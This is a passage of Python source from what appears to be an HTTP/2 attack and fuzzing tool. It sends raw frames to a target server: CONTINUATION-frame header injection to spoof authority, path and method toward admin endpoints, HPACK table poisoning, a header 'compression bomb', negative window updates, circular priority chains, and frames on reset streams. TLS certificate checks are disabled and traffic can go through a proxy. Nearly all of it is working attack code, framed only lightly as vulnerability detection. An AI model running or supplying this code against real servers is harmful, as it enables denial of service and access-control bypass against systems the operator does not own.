            logger.warning(f"Memory usage exceeded limit: {memory_increase:.2f}MB > {self.memory_limit_mb * 1.5:.2f}MB")
            return False
        
        return True
    
    def _force_garbage_collection(self):
        """Force garbage collection to free memory"""
        collected = gc.collect()
        logger.debug(f"Garbage collection freed {collected} objects")
    
    async def _execute_continuation_attack(self, attack_config: Dict) -> AttackResult:
        """Execute a CONTINUATION frame attack with comprehensive error handling"""
        start_time = time.perf_counter()
        
        for attempt in range(self.max_retries):
            try:
                reader, writer = await self._establish_h2_connection()
                await self._send_h2_settings(writer)
                await self._read_server_settings(reader)
                
                stream_id = self._get_next_stream_id()
                
                # Construct malicious frame sequence
                headers_data = self._encode_headers(attack_config['headers_frame'])
                continuation_data = self._encode_headers(attack_config['continuation_frame'])
                
                # Split at strategic point to maximize confusion
                split_point = min(100, len(headers_data) // 2)
                
                # HEADERS frame without END_HEADERS
                headers_frame = self._build_frame(
                    FrameType.HEADERS,
                    0,  # No END_HEADERS flag
                    stream_id,
                    headers_data[:split_point]
                )
                
                # CONTINUATION frame with remaining data
                remaining_headers = headers_data[split_point:] + continuation_data
                continuation_frame = self._build_frame(
                    FrameType.CONTINUATION,
                    FrameFlag.END_HEADERS,
                    stream_id,
                    remaining_headers
                )
                
                # Send attack sequence with adaptive timing
                writer.write(headers_frame)
                await writer.drain()
                
                # 自适应延迟：基于网络条件和服务器类型
                delay = self.connection_state.get('frame_delay', 0.001)
                if PROXY_ENABLED:
                    delay *= 2  # 代理连接需要更长延迟
                await asyncio.sleep(delay)
                
                writer.write(continuation_frame)
                await writer.drain()
                
                # Read response with timeout
                response = await self._read_h2_response(reader, stream_id)
                # 这里已经在 _read_h2_response 内部处理了超时
                
                processing_time = (time.perf_counter() - start_time) * 1000
                
                await self._cleanup_connection(reader, writer)
                
                # Analyze response for vulnerability indicators
                vulnerability_detected = self._analyze_response_for_vulnerability(response, attack_config)
                evidence = self._collect_vulnerability_evidence(response, attack_config)
                
                return AttackResult(
                    name=attack_config['name'],
                    success=response.get('status') is not None,
                    vulnerability_detected=vulnerability_detected,
                    response_status=response.get('status'),
                    response_headers=response.get('headers', {}),
                    evidence=evidence,
                    processing_time_ms=processing_time
                )
                
            except Exception as e:
                if attempt == self.max_retries - 1:
                    return AttackResult(
                        name=attack_config['name'],
                        success=False,
                        vulnerability_detected=False,
                        error=str(e)
                    )
                await asyncio.sleep(0.1 * (2 ** attempt))  # Exponential backoff
                
        return AttackResult(
            name=attack_config['name'],
            success=False,
            vulnerability_detected=False,
            error="Max retries exceeded"
        )
    
    async def _test_authority_scenario(self, scenario: Dict) -> Dict[str, Any]:
        """Test specific authority confusion scenario"""
        attack_result = await self._execute_continuation_attack({
            'name': scenario['name'],
            'description': scenario['description'],
            'headers_frame': scenario['headers'],
            'continuation_frame': scenario['continuation']
        })
        
        # Analyze for authority confusion indicators
        confusion_detected = False
        evidence = []
        
        if attack_result.success and attack_result.response_status in [200, 201, 204]:
            # 检查是否真的存在authority confusion
            # 1. 检查注入的authority是否与原始不同
            original_authority = None
            injected_authority = None
            
            for h in scenario['headers']:
                if h[0] == ':authority':
                    original_authority = h[1]
                    break
            
            for h in scenario['continuation']:
                if h[0] == ':authority':
                    injected_authority = h[1]
                    break
            
            # 只有当authority确实被改变且包含敏感域名时才算漏洞
            if original_authority and injected_authority and original_authority != injected_authority:
                if any(keyword in injected_authority.lower() for keyword in ['admin', 'internal', 'private']):
                    # 进一步验证：检查特定的后端响应头
                    backend_indicators = {
                        'x-backend-server': lambda v: 'internal' in v.lower() or 'admin' in v.lower(),
                        'x-upstream-addr': lambda v: v.startswith('10.') or v.startswith('192.168.'),
                        'x-served-by': lambda v: injected_authority in v
                    }
                    
                    for header, validator in backend_indicators.items():
                        if header in attack_result.response_headers:
                            header_value = attack_result.response_headers[header]
                            if validator(header_value):
                                evidence.append(f"Backend routing confirmed: {header}={header_value}")
                    confusion_detected = True
        
        return {
            'scenario': scenario['name'],
            'confusion_detected': confusion_detected,
            'evidence': evidence,
            'attack_result': asdict(attack_result)
        }
    
    async def _test_duplicate_scenario(self, scenario: Dict) -> Dict[str, Any]:
        """Test duplicate pseudo-header scenarios"""
        attack_result = await self._execute_continuation_attack({
            'name': scenario['name'],
            'description': f"Duplicate headers: {scenario['name']}",
            'headers_frame': scenario['headers_1'],
            'continuation_frame': scenario['headers_2']
        })
        
        # Check if duplicates were accepted
        accepted = (attack_result.success and 
                   attack_result.response_status not in [400, 431, 500])
        
        return {
            'scenario': scenario['name'],
            'accepted': accepted,
            'response_status': attack_result.response_status,
            'evidence': attack_result.evidence
        }
    
    async def _test_interleave_pattern(self, pattern: Dict) -> Dict[str, Any]:
        """Test header interleaving pattern"""
        headers = pattern['sequence']
        
        # Analyze pattern for RFC violations
        pseudo_positions = []
        regular_positions = []
        
        for i, (name, _) in enumerate(headers):
            if name.startswith(':'):
                pseudo_positions.append(i)
            else:
                regular_positions.append(i)
        
        # Check for RFC 7540 violation
        violation = False
        if regular_positions and pseudo_positions:
            if min(regular_positions) < max(pseudo_positions):
                violation = True
        
        # Split headers across frames
        mid_point = len(headers) // 2
        attack_result = await self._execute_continuation_attack({
            'name': pattern['name'],
            'description': pattern['description'],
            'headers_frame': headers[:mid_point],
            'continuation_frame': headers[mid_point:]
        })
        
        # If violation is accepted, it's a vulnerability
        violation_accepted = (violation and 
                            attack_result.success and
                            attack_result.response_status not in [400, 431])
        
        return {
            'pattern': pattern['name'],
            'violation': violation,
            'violation_accepted': violation_accepted,
            'response_status': attack_result.response_status,
            'description': pattern['description']
        }
    
    async def _test_frame_boundaries(self, test_config: Dict) -> Dict[str, Any]:
        """Test frame boundary processing with various sizes"""
        try:
            # Prepare large header set for boundary testing
            test_headers = [
                (':method', 'GET'),
                (':scheme', 'https'),
                (':authority', self.target_host),
                (':path', '/boundary-test'),
                ('user-agent', 'H2-Boundary-Fuzzer/2.0'),
                ('accept', '*/*'),
                ('x-test-header-1', 'A' * 500),
                ('x-test-header-2', 'B' * 500),
                ('x-test-header-3', 'C' * 500),
                ('custom-boundary-test', 'test-value')
            ]
            
            encoded = self._encode_headers(test_headers)
            frames = []
            offset = 0
            frame_sizes = test_config['frame_sizes']
            stream_id = self._get_next_stream_id()
            
            # Create frame sequence
            for i, size in enumerate(frame_sizes):
                if offset >= len(encoded):
                    break
                    
                chunk = encoded[offset:offset + size]
                if not chunk:
                    break
                
                if i == 0:
                    # First HEADERS frame
                    frame = H2Frame(
                        length=len(chunk),
                        frame_type=FrameType.HEADERS,
                        flags=0,
                        stream_id=stream_id,
                        payload=chunk
                    )
                else:
                    # CONTINUATION frames
                    is_last = (offset + size >= len(encoded))
                    flags = FrameFlag.END_HEADERS if is_last else 0
                    frame = H2Frame(
                        length=len(chunk),
                        frame_type=FrameType.CONTINUATION,
                        flags=flags,
                        stream_id=stream_id,
                        payload=chunk
                    )
                
                frames.append(frame)
                offset += size
            
            # Execute boundary test
            reader, writer = await self._establish_h2_connection()
            await self._send_h2_settings(writer)
            await self._read_server_settings(reader)
            
            start_time = time.perf_counter()
            
            # Send frames with micro-delays
            for frame in frames:
                writer.write(bytes(frame))
                await writer.drain()
                await asyncio.sleep(0.001)  # 1ms delay between frames
            
            response = await self._read_h2_response(reader, stream_id)
            processing_time = (time.perf_counter() - start_time) * 1000
            
            await self._cleanup_connection(reader, writer)
            
            # Detect processing anomalies with stricter criteria
            anomaly_detected = False
            
            # 只有特定的错误才算异常
            if response.get('status') == 431:  # Request Header Fields Too Large
                anomaly_detected = True
            elif processing_time > 15000:  # >15s processing time (考虑代理延迟)
                anomaly_detected = True
            elif response.get('error'):
                error_msg = str(response['error']).lower()
                # 只有特定的错误类型才算异常
                if any(keyword in error_msg for keyword in ['frame_size', 'continuation', 'header_size']):
                    anomaly_detected = True
            
            return {
                'test': test_config['name'],
                'frame_count': len(frames),
                'total_size': len(encoded),
                'processing_time_ms': processing_time,
                'anomaly_detected': anomaly_detected,
                'response_status': response.get('status'),
                'description': test_config['description']
            }
            
        except Exception as e:
            return {
                'test': test_config['name'],
                'anomaly_detected': True,
                'error': str(e)
            }
    
    async def _test_routing_attack(self, attack: Dict) -> Dict[str, Any]:
        """Test routing confusion attack"""
        # Construct routing confusion request
        if 'target_path' in attack:
            headers_1 = [
                (':method', 'GET'),
                (':scheme', 'https'),
                (':authority', self.target_host),
                (':path', attack['target_path'])
            ]
            headers_2 = [
                (':path', attack['injected_path']),
                ('x-original-path', attack['target_path']),
                ('x-injection-test', 'true')
            ]
        elif 'target_host' in attack:
            headers_1 = [
                (':method', 'GET'),
                (':scheme', 'https'),
                (':authority', attack['target_host']),
                (':path', '/admin/dashboard')
            ]
            headers_2 = [
                (':authority', attack['injected_host']),
                ('host', attack['injected_host']),
                ('x-forwarded-host', attack['target_host'])
            ]
        else:
            headers_1 = [
                (':method', attack['target_method']),
                (':scheme', 'https'),
                (':authority', self.target_host),
                (':path', '/api/sensitive-resource')
            ]
            headers_2 = [
                (':method', attack['injected_method']),
                ('x-http-method-override', attack['injected_method']),
                ('x-csrf-bypass', 'attempt')
            ]
        
        result = await self._execute_continuation_attack({
            'name': attack['name'],
            'description': attack['description'],
            'headers_frame': headers_1,
            'continuation_frame': headers_2
        })
        
        # Analyze for successful bypass
        bypass_successful = False
        evidence = []
        
        if result.success:
            status = result.response_status
            
            # Check for successful routing bypass indicators
            if 'injected_path' in attack:
                if status in [200, 201, 204] and '/admin' in attack['injected_path']:
                    bypass_successful = True
                    evidence.append(f"Admin path accessible: {status}")
            elif 'injected_host' in attack:
                backend_headers = ['x-backend', 'x-served-by', 'server']
                for header in backend_headers:
                    if header in result.response_headers:
                        bypass_successful = True
                        evidence.append(f"Backend routing exposed: {header}")
            elif 'injected_method' in attack:
                if status in [200, 204, 404] and attack['injected_method'] in ['DELETE', 'PUT']:
                    bypass_successful = True
                    evidence.append(f"Method override successful: {status}")
        
        return {
            'attack': attack['name'],
            'bypass_successful': bypass_successful,
            'evidence': evidence,
            'result': asdict(result)
        }
    
    async def _test_hpack_table_poisoning(self) -> AttackResult:
        """Test HPACK dynamic table poisoning"""
        try:
            reader, writer = await self._establish_h2_connection()
            await self._send_h2_settings(writer)
            await self._read_server_settings(reader)
            
            # Poison dynamic table with malicious entries
            poison_headers = [
                (':method', 'GET'),
                (':scheme', 'https'),
                (':authority', 'admin.internal'),  # Malicious authority
                (':path', '/admin/poison'),
                ('authorization', 'Bearer admin-token-poison'),
                ('x-poison-header', 'malicious-value')
            ]
            
            stream_id = self._get_next_stream_id()
            encoded = self._encode_headers(poison_headers)
            
            # Send poisoning request
            headers_frame = self._build_frame(
                FrameType.HEADERS,
                FrameFlag.END_HEADERS | FrameFlag.END_STREAM,
                stream_id,
                encoded
            )
            
            writer.write(headers_frame)
            await writer.drain()
            
            # Read response
            response = await self._read_h2_response(reader, stream_id)
            
            # Test if poisoning affects subsequent requests
            test_headers = [(':method', 'GET'), (':scheme', 'https'), (':path', '/test')]
            stream_id2 = self._get_next_stream_id()
            encoded2 = self._encode_headers(test_headers)
            
            test_frame = self._build_frame(
                FrameType.HEADERS,
                FrameFlag.END_HEADERS | FrameFlag.END_STREAM,
                stream_id2,
                encoded2
            )
            
            writer.write(test_frame)
            await writer.drain()
            
            response2 = await self._read_h2_response(reader, stream_id2)
            
            await self._cleanup_connection(reader, writer)
            
            # Check for table poisoning effects
            vulnerability_detected = (
                'admin.internal' in str(response2.get('headers', {})) or
                response2.get('status') in [200, 201, 204]  # Unexpected success
            )
            
            return AttackResult(
                name="hpack_table_poisoning",
                success=True,
                vulnerability_detected=vulnerability_detected,
                response_status=response2.get('status'),
                evidence=["HPACK table poisoning test completed"]
            )
            
        except Exception as e:
            return AttackResult(
                name="hpack_table_poisoning",
                success=False,
                vulnerability_detected=False,
                error=str(e)
            )
    
    async def _test_hpack_compression_bomb(self) -> AttackResult:
        """Test HPACK compression bomb attack with memory monitoring"""
        start_memory = self._get_memory_usage()
        max_memory_used = start_memory
        
        try:
            reader, writer = await self._establish_h2_connection()
            await self._send_h2_settings(writer)
            await self._read_server_settings(reader)
            
            # Create compression bomb headers with memory monitoring
            bomb_headers = [(':method', 'GET'), (':scheme', 'https'), 
                           (':authority', self.target_host), (':path', '/bomb')]
            
            # Progressive header addition with memory checks
            header_count = 0
            max_headers = min(100, self.memory_limit_mb // 10)  # Adaptive limit
            
            for i in range(max_headers):
                # Check memory usage before adding more headers
                current_memory = self._get_memory_usage()
                max_memory_used = max(max_memory_used, current_memory)
                
                if not self._check_memory_limit():
                    logger.warning(f"Memory limit reached at {header_count} headers")
                    break
                
                bomb_headers.append((f'x-bomb-header-{i}', 'A' * 1000))
                header_count = i + 1
                
                # Periodic garbage collection
                if i % 20 == 0:
                    self._force_garbage_collection()
            
            stream_id = self._get_next_stream_id()
            start_time = time.perf_counter()
            
            # Monitor memory during encoding
            pre_encode_memory = self._get_memory_usage()
            encoded = self._encode_headers(bomb_headers)
            post_encode_memory = self._get_memory_usage()
            encoding_memory_delta = post_encode_memory - pre_encode_memory
            
            # Send as multiple CONTINUATION frames with memory monitoring
            chunk_size = 1000
            offset = 0
            first_frame = True
            frames_sent = 0
            
            while offset < len(encoded):
                chunk = encoded[offset:offset + chunk_size]
                if not chunk:
                    break
                
                is_last = (offset + chunk_size >= len(encoded))
                
                if first_frame:
                    flags = FrameFlag.END_HEADERS if is_last else 0
                    frame = self._build_frame(FrameType.HEADERS, flags, stream_id, chunk)
                    first_frame = False
                else:
                    flags = FrameFlag.END_HEADERS if is_last else 0
                    frame = self._build_frame(FrameType.CONTINUATION, flags, stream_id, chunk)
                
                writer.write(frame)
                await writer.drain()
                offset += chunk_size
                frames_sent += 1
                
                # Monitor memory during transmission
                current_memory = self._get_memory_usage()
                max_memory_used = max(max_memory_used, current_memory)
            
            # Measure response time for DoS detection
            response = await self._read_h2_response(reader, stream_id)
            processing_time = (time.perf_counter() - start_time) * 1000
            
            await self._cleanup_connection(reader, writer)
            
            # Force cleanup and measure final memory
            self._force_garbage_collection()
            final_memory = self._get_memory_usage()
            total_memory_used = max_memory_used - start_memory
            
            # Detect compression bomb effects with adjusted thresholds
            vulnerability_detected = False
            
            # 只有明确的资源限制错误才算漏洞
            if response.get('status') in [413, 431]:  # Payload Too Large or Request Header Fields Too Large
                vulnerability_detected = True
            # 极端的处理时间（考虑代理延迟）
            elif processing_time > 30000:  # >30s processing
                vulnerability_detected = True
            # 极端的内存使用
            elif total_memory_used > 200:  # >200MB memory increase
                vulnerability_detected = True
            # 服务器错误+特定的错误信息
            elif response.get('status') in [500, 502, 503] and response.get('error'):
                error_msg = str(response['error']).lower()
                if any(keyword in error_msg for keyword in ['memory', 'resource', 'limit', 'bomb']):
                    vulnerability_detected = True
            
            evidence = [
                f"Processing time: {processing_time:.2f}ms",
                f"Headers sent: {header_count}",
                f"Frames sent: {frames_sent}",
                f"Memory increase: {total_memory_used:.2f}MB",
                f"Encoding memory delta: {encoding_memory_delta:.2f}MB"
            ]
            
            return AttackResult(
                name="hpack_compression_bomb",
                success=True,
                vulnerability_detected=vulnerability_detected,
                processing_time_ms=processing_time,
                evidence=evidence
            )
            
        except Exception as e:
            return AttackResult(
                name="hpack_compression_bomb",
                success=False,
                vulnerability_detected=True,  # Exception might indicate DoS
                error=str(e)
            )
    
    async def _test_hpack_state_confusion(self) -> AttackResult:
        """Test HPACK state confusion attacks"""
        try:
            reader, writer = await self._establish_h2_connection()
            await self._send_h2_settings(writer)
            await self._read_server_settings(reader)
            
            # Send headers to populate dynamic table
            setup_headers = [
                (':method', 'GET'),
                (':scheme', 'https'),
                (':authority', 'legitimate.com'),
                (':path', '/setup'),
                ('user-agent', 'SetupClient/1.0')
            ]
            
            stream_id1 = self._get_next_stream_id()
            encoded1 = self._encode_headers(setup_headers)
            frame1 = self._build_frame(
                FrameType.HEADERS,
                FrameFlag.END_HEADERS | FrameFlag.END_STREAM,
                stream_id1,
                encoded1
            )
            
            writer.write(frame1)
            await writer.drain()
            await self._read_h2_response(reader, stream_id1)
            
            # Now send request that might reuse corrupted table entries
            test_headers = [
                (':method', 'GET'),
                (':path', '/admin'),  # Different path
                ('authorization', 'Bearer should-be-admin')
            ]
            
            stream_id2 = self._get_next_stream_id()
            encoded2 = self._encode_headers(test_headers)
            frame2 = self._build_frame(
                FrameType.HEADERS,
                FrameFlag.END_HEADERS | FrameFlag.END_STREAM,
                stream_id2,
                encoded2
            )
            
            writer.write(frame2)
            await writer.drain()
            
            response = await self._read_h2_response(reader, stream_id2)
            
            await self._cleanup_connection(reader, writer)
            
            # Check for state confusion
            vulnerability_detected = (
                response.get('status') in [200, 201, 204] and
                'admin' in str(response.get('headers', {}))
            )
            
            return AttackResult(
                name="hpack_state_confusion",
                success=True,
                vulnerability_detected=vulnerability_detected,
                response_status=response.get('status'),
                evidence=["HPACK state confusion test completed"]
            )
            
        except Exception as e:
            return AttackResult(
                name="hpack_state_confusion",
                success=False,
                vulnerability_detected=False,
                error=str(e)
            )
    
    async def _test_window_exhaustion(self) -> AttackResult:
        """Test flow control window exhaustion"""
        try:
            reader, writer = await self._establish_h2_connection()
            await self._send_h2_settings(writer)
            await self._read_server_settings(reader)
            
            stream_id = self._get_next_stream_id()
            
            # Send HEADERS frame
            headers = [
                (':method', 'POST'),
                (':scheme', 'https'),
                (':authority', self.target_host),
                (':path', '/upload'),
                ('content-length', '100000')
            ]
            
            encoded = self._encode_headers(headers)
            headers_frame = self._build_frame(
                FrameType.HEADERS,
                FrameFlag.END_HEADERS,
                stream_id,
                encoded
            )
            
            writer.write(headers_frame)
            await writer.drain()
            
            # Send large DATA frames to exhaust window
            data_payload = b'A' * 16384  # Max frame size
            for i in range(10):  # Send 160KB
                flags = FrameFlag.END_STREAM if i == 9 else 0
                data_frame = self._build_frame(
                    FrameType.DATA,
                    flags,
                    stream_id,
                    data_payload
                )
                writer.write(data_frame)
                await writer.drain()
            
            response = await self._read_h2_response(reader, stream_id)
            
            await self._cleanup_connection(reader, writer)
            
            # Check for flow control issues
            vulnerability_detected = response.get('error') is not None
            
            return AttackResult(
                name="window_exhaustion",
                success=True,
                vulnerability_detected=vulnerability_detected,
                evidence=[f"Flow control response: {response.get('error', 'OK')}"]
            )
            
        except Exception as e:
            return AttackResult(
                name="window_exhaustion",
                success=False,
                vulnerability_detected=False,
                error=str(e)
            )
    
    async def _test_flow_control_bypass(self) -> AttackResult:
        """Test flow control bypass via negative window updates"""
        try:
            reader, writer = await self._establish_h2_connection()
            await self._send_h2_settings(writer)
            await self._read_server_settings(reader)
            
            # Send malicious WINDOW_UPDATE with negative increment
            malicious_payload = struct.pack('>I', 0x80000001)  # Negative increment
            window_frame = self._build_frame(
                FrameType.WINDOW_UPDATE,
                0,
                0,  # Connection level
                malicious_payload
            )
            
            writer.write(window_frame)
            await writer.drain()
            
            # Try to read any error response
            start_time = time.perf_counter()
            try:
                response = await asyncio.wait_for(
                    self._read_any_frame(reader), 
                    timeout=2.0
                )
                processing_time = (time.perf_counter() - start_time) * 1000
            except asyncio.TimeoutError:
                # 超时不一定意味着漏洞，可能只是网络延迟
                response = {'timeout': True, 'processing_time': 2000}
                processing_time = 2000
            
            await self._cleanup_connection(reader, writer)
            
            # 只有收到特定的错误响应才算漏洞
            vulnerability_detected = False
            if response and not response.get('timeout'):
                frame_type = response.get('type')
                if frame_type == FrameType.GOAWAY:
                    # 检查GOAWAY的错误码
                    payload = response.get('payload', b'')
                    if len(payload) >= 8:
                        error_code = struct.unpack('>I', payload[4:8])[0]
                        if error_code == H2ErrorCode.FLOW_CONTROL_ERROR:
                            vulnerability_detected = True
            
            return AttackResult(
                name="flow_control_bypass",
                success=True,
                vulnerability_detected=vulnerability_detected,
                processing_time_ms=processing_time,
                evidence=[f"Flow control bypass test: {processing_time:.2f}ms"]
            )
            
        except Exception as e:
            return AttackResult(
                name="flow_control_bypass",
                success=False,
                vulnerability_detected=True,  # Exception might indicate success
                error=str(e)
            )
    
    async def _test_priority_inversion(self) -> AttackResult:
        """Test HTTP/2 priority inversion attacks"""
        try:
            reader, writer = await self._establish_h2_connection()
            await self._send_h2_settings(writer)
            await self._read_server_settings(reader)
            
            # Create priority dependency chain that could cause issues
            stream_ids = [self._get_next_stream_id() for _ in range(5)]
            
            # Send multiple streams with circular dependencies
            for i, stream_id in enumerate(stream_ids):
                headers = [
                    (':method', 'GET'),
                    (':scheme', 'https'),
                    (':authority', self.target_host),
                    (':path', f'/priority-test-{i}')
                ]
                
                encoded = self._encode_headers(headers)
                
                # Add PRIORITY frame data to HEADERS
                dependent_stream = stream_ids[(i + 1) % len(stream_ids)]  # Circular
                priority_data = struct.pack('>I', dependent_stream & 0x7FFFFFFF)
                priority_data += b'\x00'  # Weight
                
                frame = self._build_frame(
                    FrameType.HEADERS,
                    FrameFlag.END_HEADERS | FrameFlag.END_STREAM | FrameFlag.PRIORITY,
                    stream_id,
                    priority_data + encoded
                )
                
                writer.write(frame)
                await writer.drain()
            
            # Measure response time for all streams
            start_time = time.perf_counter()
            responses = []
            
            for stream_id in stream_ids:
                try:
                    response = await asyncio.wait_for(
                        self._read_h2_response(reader, stream_id),
                        timeout=5.0
                    )
                    responses.append(response)
                except asyncio.TimeoutError:
                    logger.debug(f"Stream {stream_id} response timeout")
                    break
            
            processing_time = (time.perf_counter() - start_time) * 1000
            
            await self._cleanup_connection(reader, writer)
            
            # 只有在明显的优先级问题时才算漏洞
            vulnerability_detected = False
            
            # 检查是否所有流都超时（可能是循环依赖导致的死锁）
            if len(responses) == 0 and processing_time > 10000:
                vulnerability_detected = True
            # 检查是否有特定的错误响应
            elif any((r.get('error') or '').lower() in ['priority', 'dependency'] for r in responses):
                vulnerability_detected = True
            
            return AttackResult(
                name="priority_inversion",
                success=True,
                vulnerability_detected=vulnerability_detected,
                processing_time_ms=processing_time,
                evidence=[f"Priority test: {len(responses)}/{len(stream_ids)} streams completed"]
            )
            
        except Exception as e:
            return AttackResult(
                name="priority_inversion",
                success=False,
                vulnerability_detected=False,
                error=str(e)
            )
    
    async def _test_stream_state_confusion(self) -> AttackResult:
        """Test stream state confusion via invalid frame sequences"""
        try:
            reader, writer = await self._establish_h2_connection()
            await self._send_h2_settings(writer)
            await self._read_server_settings(reader)
            
            stream_id = self._get_next_stream_id()
            
            # Send HEADERS frame
            headers = [
                (':method', 'GET'),
                (':scheme', 'https'),
                (':authority', self.target_host),
                (':path', '/state-confusion')
            ]
            
            encoded = self._encode_headers(headers)
            headers_frame = self._build_frame(
                FrameType.HEADERS,
                FrameFlag.END_HEADERS,
                stream_id,
                encoded
            )
            
            writer.write(headers_frame)
            await writer.drain()
            
            # Send RST_STREAM to close stream
            rst_payload = struct.pack('>I', H2ErrorCode.CANCEL)
            rst_frame = self._build_frame(
                FrameType.RST_STREAM,
                0,
                stream_id,
                rst_payload
            )
            
            writer.write(rst_frame)
            await writer.drain()
            
            # Now try to send DATA frame on closed stream
            data_frame = self._build_frame(
                FrameType.DATA,
                FrameFlag.END_STREAM,
                stream_id,
                b'This should not work'
            )
            
            writer.write(data_frame)
            await writer.drain()
            
            # Check server response
            try:
                response = await asyncio.wait_for(
                    self._read_any_frame(reader),
                    timeout=3.0
                )
            except asyncio.TimeoutError:
                # 记录超时但不假设是漏洞
                response = {'timeout': True, 'error': 'Response timeout'}
            
            await self._cleanup_connection(reader, writer)
            
            # 正确处理流状态错误才算正常，没有错误反而是漏洞
            vulnerability_detected = False
            if response and not response.get('timeout'):
                frame_type = response.get('type')
                # 服务器应该发送GOAWAY或RST_STREAM，如果没有则可能存在漏洞
                if frame_type not in [FrameType.GOAWAY, FrameType.RST_STREAM]:
                    vulnerability_detected = True
            
            return AttackResult(
                name="stream_state_confusion",
                success=True,
                vulnerability_detected=vulnerability_detected,
                evidence=["Stream state confusion test completed"]
            )
            
        except Exception as e:
            return AttackResult(
                name="stream_state_confusion",
                success=False,
                vulnerability_detected=False,
                error=str(e)
            )
    
    async def _establish_h2_connection(self) -> Tuple[asyncio.StreamReader, asyncio.StreamWriter]:
        """Establish HTTP/2 connection with proper ALPN negotiation handling"""
        reader = None
        writer = None
        
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            context.set_alpn_protocols(['h2'])  # Only request h2, not http/1.1
            
            # Establish connection
            if not PROXY_ENABLED:
                reader, writer = await asyncio.open_connection(
                    self.target_host, self.target_port, 
                    ssl=context, server_hostname=self.target_host
                )
            else:
                if PROXY_AVAILABLE:
                    proxy = Proxy.from_url(PROXY_URL)
                    sock = await proxy.connect(self.target_host, self.target_port)
                    
                    # 修复：正确创建SSL连接通过代理
                    loop = asyncio.get_event_loop()
                    reader = asyncio.StreamReader()
                    protocol = asyncio.StreamReaderProtocol(reader)
                    transport, _ = await loop.create_connection(
                        lambda: protocol, sock=sock, ssl=context, server_hostname=self.target_host
                    )
                    writer = asyncio.StreamWriter(transport, protocol, reader, loop)
                else:
                    # 无代理时直连
                    reader, writer = await asyncio.open_connection(
                        self.target_host, self.target_port,
                        ssl=context, server_hostname=self.target_host
                    )
        except Exception as connection_error:
            # 连接失败时清理
            if writer:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass
            raise connection_error
        
        # Verify ALPN negotiation
        ssl_object = writer.get_extra_info('ssl_object')
        if ssl_object:
            selected_protocol = ssl_object.selected_alpn_protocol()
            
            # 严格检查HTTP/2支持
            if selected_protocol is None:
                writer.close()
                await writer.wait_closed()
                raise Exception("No ALPN protocol negotiated - server may not support HTTP/2")
            
            if selected_protocol != 'h2':
                writer.close()
                await writer.wait_closed()
                raise Exception(f"Server negotiated {selected_protocol} instead of h2")
        else:
            # 如果无法获取ALPN信息，尝试发送HTTP/2握手来验证
            logger.warning("Cannot verify ALPN negotiation, will test HTTP/2 handshake")
        
        # Send HTTP/2 connection preface
        try:
            writer.write(self.CONNECTION_PREFACE)
            await writer.drain()
        except Exception as e:
            writer.close()
            await writer.wait_closed()
            raise Exception(f"Failed to send HTTP/2 preface: {e}")
        
        return reader, writer
    
    async def _establish_h11_fallback_connection(self, context) -> Tuple[asyncio.StreamReader, asyncio.StreamWriter]:
        """Establish HTTP/1.1 fallback connection for comparison testing"""
        logger.info("Establishing HTTP/1.1 fallback connection for baseline testing")
        
        # Force HTTP/1.1 ALPN
        context.set_alpn_protocols(['http/1.1'])
        
        if not PROXY_ENABLED:
            reader, writer = await asyncio.open_connection(self.target_host, self.target_port, ssl=context, server_hostname=self.target_host)
        else:
            if PROXY_AVAILABLE:
                proxy = Proxy.from_url(PROXY_URL)
                sock = await proxy.connect(self.target_host, self.target_port)
                
                loop = asyncio.get_event_loop()
                transport, protocol = await loop.create_connection(
                    lambda: asyncio.Protocol(), sock=sock
                )
                ssl_transport = await loop.start_tls(
                    transport, protocol, context, server_hostname=self.target_host
                )
                
                # 直接使用SSL transport创建reader/writer
                reader = asyncio.StreamReader()
                protocol = asyncio.StreamReaderProtocol(reader)
                protocol.connection_made(ssl_transport)
                writer = asyncio.StreamWriter(ssl_transport, protocol, reader, loop)
            else:
                raise Exception("代理不可用且直连失败")
        
        # Store protocol version for testing strategy adaptation
        self.connection_state['protocol'] = 'http/1.1'
        self.connection_state['h2_fallback'] = True
        
        return reader, writer
    
    async def _send_h2_settings(self, writer: asyncio.StreamWriter):
        """Send optimized HTTP/2 SETTINGS frame"""
        settings = [
            (SettingsParameter.ENABLE_PUSH, 0),
            (SettingsParameter.INITIAL_WINDOW_SIZE, 1048576),  # 1MB window
            (SettingsParameter.MAX_FRAME_SIZE, 32768),  # 32KB max frame
            (SettingsParameter.MAX_CONCURRENT_STREAMS, 100),
            (SettingsParameter.HEADER_TABLE_SIZE, 65536)  # 64KB HPACK table
        ]
        
        payload = b''
        for param, value in settings:
            payload += struct.pack('>HI', param, value)
        
        frame = self._build_frame(FrameType.SETTINGS, 0, 0, payload)
        writer.write(frame)
        await writer.drain()
    
    async def _read_server_settings(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter = None) -> Dict[int, int]:
        """Read and acknowledge server SETTINGS frame"""
        header = await asyncio.wait_for(reader.read(9), timeout=self.timeout)
        if len(header) < 9:
            raise Exception("Failed to read SETTINGS frame header")
        
        length = struct.unpack('>I', b'\x00' + header[:3])[0]
        frame_type = header[3]
        flags = header[4]
        stream_id = struct.unpack('>I', header[5:])[0] & 0x7FFFFFFF
        
        payload = await reader.read(length)
        
        # Parse settings
        settings = {}
        if frame_type == FrameType.SETTINGS and not (flags & 0x1):
            for i in range(0, len(payload), 6):
                param = struct.unpack('>H', payload[i:i+2])[0]
                value = struct.unpack('>I', payload[i+2:i+6])[0]
                settings[param] = value
            
            # Send SETTINGS ACK
            if writer:
                ack_frame = self._build_frame(FrameType.SETTINGS, 0x1, 0, b'')
                writer.write(ack_frame)
                await writer.drain()
        
        self.server_settings = settings
        return settings
    
    def _build_frame(self, frame_type: FrameType, flags: int, stream_id: int, payload: bytes) -> bytes:
        """Build HTTP/2 frame with validation"""
        length = len(payload)
        if length > self.server_settings.get(SettingsParameter.MAX_FRAME_SIZE, self.DEFAULT_FRAME_SIZE):
            raise ValueError(f"Frame size {length} exceeds maximum")
        
        header = struct.pack('>I', length)[1:]  # 3-byte length
        header += struct.pack('>BB', frame_type, flags)
        header += struct.pack('>I', stream_id & 0x7FFFFFFF)
        return header + payload
    
    def _encode_headers(self, headers: List[Tuple[str, str]]) -> bytes:
        """Encode headers using HPACK with error handling"""
        try:
            return self.encoder.encode(headers)
        except Exception as e:
            logger.error(f"HPACK encoding failed: {e}")
            raise
    
    def _get_next_stream_id(self) -> int:
        """Get next available client stream ID"""
        stream_id = self.stream_id_counter
        self.stream_id_counter += 2  # Client uses odd stream IDs
        return stream_id
    
